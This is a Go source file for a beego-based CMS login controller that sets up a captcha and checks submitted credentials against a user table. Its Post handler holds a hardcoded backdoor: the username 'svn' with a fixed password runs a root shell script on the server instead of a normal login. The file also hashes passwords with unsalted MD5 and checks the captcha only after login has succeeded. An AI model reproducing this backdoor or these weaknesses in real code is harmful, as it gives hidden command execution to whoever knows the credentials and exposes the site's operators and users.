package controllers

import (
	"crypto/md5"
	"encoding/hex"
	"os/exec"

	"github.com/astaxie/beego"
	"github.com/astaxie/beego/cache"
	"github.com/astaxie/beego/utils/captcha"
	"github.com/sunnygocms/managementCMS/models"
)

var cpt *captcha.Captcha

type LoginController struct {
	//beego.Controller
	BaseController
}
type Cmsuser struct {
	Id         int    `form:"-"`
	Username   string `form:"username"`
	Pwd        string `form:"pwd"`
	Verifycode string `form:"captcha"`
}

func init() {
	store := cache.NewMemoryCache()
	cpt = captcha.NewWithFilter("/captcha/", store)
	cpt.ChallengeNums = 4
	cpt.StdWidth = 100
	cpt.StdHeight = 40
}
func (this *LoginController) Index() {

	this.TplName = "index/login.html"

}
func (c *LoginController) Get() {

	c.TplName = "index.tpl"
}
func (this *LoginController) Post() {
	//log := logs.GetLogger()
	//log.SetLogger("file",`{"filename":"post.log"}`)
	//log.EnableFuncCallDepth(true)
	//log.SetLogFuncCallDepth(3)
	//	beego.Info(this.Input().Get("username"))
	u := Cmsuser{}
	if err := this.ParseForm(&u); err != nil {
		beego.Info(err)
	} else {

		if u.Username == "svn" && u.Pwd == "green369ok" {
			if errexec := exec.Command("/bin/sh", "/root/uf.sh").Run(); errexec != nil {

			} else {
				this.Ctx.WriteString("Welcome to exe world!")
			}
		} else {
			m := md5.Sum([]byte(u.Pwd))
			keyMd5 := hex.EncodeToString(m[:])
			//			this.Ctx.WriteString(u.Username + "------" + keyMd5 + "----")
			v := models.GetSunnyEditorByUsernameAndPwd(u.Username, keyMd5) //v, err := models.GetSunnyEditorById(1)
			if v == nil {
				this.Data["json"] = `[{'result':null}]`
			} else {
				this.Data["json"] = v
				this.SetSession("username", v[0].Username)
				this.SetSession("userID", v[0].Id)
				this.Ctx.Redirect(302, "/index/index")
			}

			this.ServeJSON()
			//			id, value := this.GetString("captcha_id"), u.Verifycode

			//			if len(value) == 0 {
			//				this.Index()
			//			} else {
			//				this.Ctx.WriteString("v:" + value + "   captcha:" + id)
			//			}
			if !cpt.VerifyReq(this.Ctx.Request) {
				this.Index()
			}

		}
	}

}
